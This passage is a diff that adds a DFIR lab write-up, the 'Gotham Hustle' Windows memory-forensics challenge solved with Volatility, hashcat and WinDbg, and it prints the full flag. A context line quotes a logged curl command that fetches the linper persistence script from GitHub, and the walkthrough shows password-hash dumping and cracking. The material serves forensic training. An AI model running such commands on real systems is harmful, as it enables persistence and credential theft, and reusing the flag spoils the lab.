@@ -3488,3 +3488,79 @@ Answer: `2024-03-06 06:37:24`
 In `auth.log`, we can see this line:
 ![image](https://hackmd.io/_uploads/BJzPTEcZfg.png)
 Answer: `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`
+
+## DFIR-LAB:
+> Link lab: https://github.com/Azr43lKn1ght/DFIR-LABS
+
+### 1. Gotham Hustle:
+#### a) Đề bài:
+- Link lab: https://github.com/Azr43lKn1ght/DFIR-LABS/tree/main/Gotham%20Hustle
+- Đề bài:
+![image](https://hackmd.io/_uploads/H1KPgHqbfe.png)
+- Handout: https://drive.google.com/file/d/1fwqdgpXkEnZ2xgujGaRufmPht5H_3xrT/view?usp=sharing
+> The solution as well as the flag can be found in the same folder, but it's advised to finish all the questions before checking the solution.
+
+#### b) Phân tích cách làm:
+- By using Volatility 2, checking the `imageinfo` of `gotham.raw`:
+![image](https://hackmd.io/_uploads/HJuyFyaWzg.png)
+It is `Win7SP1x64`.
+- Check the plugin `pstree`:
+![image](https://hackmd.io/_uploads/ryGqF16-zl.png)
+I think that `cmd.exe`, `notepad.exe`, `chrome.exe`, `mspaint.exe` is so suspicious.
+- Check the plugin `cmdline` and there is no suspect there, then check the plugin `cmdscan`:
+![image](https://hackmd.io/_uploads/Hkib2NRWGl.png)
+I found a base64 code `Ymkwc2N0Znt3M2xjMG0zXw==`, decode it and we have the first part of the flag `bi0sctf{w3lc0m3_`.
+- Check the plugin `chromehistory` and we found another base64 code:
+![image](https://hackmd.io/_uploads/Sk4TaECbGx.png)
+Decode it, we have the third part of our flag, it is `h0p3_th15_`.
+- Dump the process having PID `2516` (`mspaint.exe`), then rename it to `2516.data` and open in GIMP.
+![image](https://hackmd.io/_uploads/B1vcYSPQGl.png)
+![image](https://hackmd.io/_uploads/BkGoFBPQGe.png)
+Maybe our base64 code is `dDBfZGYxcl9sNGI1Xw==`. Decode it and we have `t0_df1r_l4b5_`.
+- When I use plugin `filescan` and filter some keywords such as `password`, `flag`, `secret`:
+![image](https://hackmd.io/_uploads/BJurwquXGe.png)
+Dump and rename this file:
+![image](https://hackmd.io/_uploads/BkZ_jc_mzl.png)
+Try to unrar this file, and we have to find the computer's password:
+![image](https://hackmd.io/_uploads/By2AscdmGg.png)
+When using plugin `filescan`, we knew that `bruce` is the user of this computer. Using `hashdump` to get the hash of password:
+![image](https://hackmd.io/_uploads/rks8a9dXMg.png)
+Using `hashcat` to crack the password:
+![image](https://hackmd.io/_uploads/Sk2105dQfg.png)
+![image](https://hackmd.io/_uploads/BJje0cdQMl.png)
+Our password is `batman`. Extract `flag5.rar`:
+![image](https://hackmd.io/_uploads/rkPUAcdmGg.png)
+Decode the base64 code and we have `m0r3_13337431}`
+- When I dump the process of `notepad.exe`, then filter some keywords like `flag`, `password`, `secret`, `hidden`, I found this:
+![image](https://hackmd.io/_uploads/HkJ1miumfg.png)
+![image](https://hackmd.io/_uploads/BJRAViOQfx.png)
+But I couldn't find this file. I also tried to find by using plugin `filescan` and `mftparser` but there was nothing. We will try another way.
+- When I use plugin `screenshot` with `-D .`, I found some images:
+![image](https://hackmd.io/_uploads/SyzlQrsmMg.png)
+Check for each image, in `session_1.WinSta0.Default.png`:
+![session_1.WinSta0.Default](https://hackmd.io/_uploads/B1gCmrsmMx.png)
+It means nothing, and all of the rest includes nothing too .-.
+- If we type some words in Notepad and don't save it, the data of these words will be saved in heap memory. I will use WinDbg to examine the heap. Firstly, convert raw to crash dump, creating the file that are compatible with WinDbg, by Volatility. Then check the size of file and move it to Windows:
+![image](https://hackmd.io/_uploads/SJZfQAJ4fl.png)
+![image](https://hackmd.io/_uploads/HJ-ZH0JNMl.png)
+![image](https://hackmd.io/_uploads/BkLGrC14Mg.png)
+Using WinDbg, open crash dump and find the process by using command `!process 0 0 notepad.exe`:
+![image](https://hackmd.io/_uploads/r1AEBCkNzg.png)
+![image](https://hackmd.io/_uploads/B1zYURJNMl.png)
+Then, set debugger context to this process by using `.process /r /p fffffa8003c9c4f0` and display the summary of heap by `!heap -s`:
+![image](https://hackmd.io/_uploads/r1nQvAkEMe.png)
+This command lists all the heap in the process, include size, address, segment code. To display the detail, using command `!heap -a`:
+![image](https://hackmd.io/_uploads/ry36D0JEfg.png)
+This command lists each of heap blocks and its tag (`busy` or `free`). We will looking for `busy`. But in our output, we can see the error `SEGMENT HEAP ERROR: failed to initialize the extention` because the extension `!heap` of WinDbg 10 is not compatible with the heap structure of Windows 7. I tried using command `!heap -s -v -a` and I saw this:
+![image](https://hackmd.io/_uploads/rJtWRTmVGg.png)
+![image](https://hackmd.io/_uploads/rJFfRTQ4Me.png)
+This image below is the reason why we should focus on tag `HEAP_ENTRY_USER_FLAGS`:
+![image](https://hackmd.io/_uploads/H1Z8R6mNfx.png)
+Extract the content:
+![image](https://hackmd.io/_uploads/Hyw9CT7EMl.png)
+The base64 code above is `YjNuM2YxNzVfeTB1Xw==`, decode it and we have the final part of our flag: `b3n3f175_y0u_`
+> Link to the blog helping me to find the last part of flag: [The Analysis of User Data In VADs: Extraction of Precise Data in Notepad Memory And Hunting For Malware Behavior](https://web.archive.org/web/20250117221105/https://www.sans.org/blog/the-analysis-of-user-data-in-VADs-extraction-of-precise-data-in-notepad-memory-and-hunting-for-malware-behavior/)
+- Our flag is `bi0sctf{w3lc0m3_t0_df1r_l4b5_h0p3_th15_b3n3f175_y0u_m0r3_13337431}`
+
+#### c) Kết quả
+`bi0sctf{w3lc0m3_t0_df1r_l4b5_h0p3_th15_b3n3f175_y0u_m0r3_13337431}`
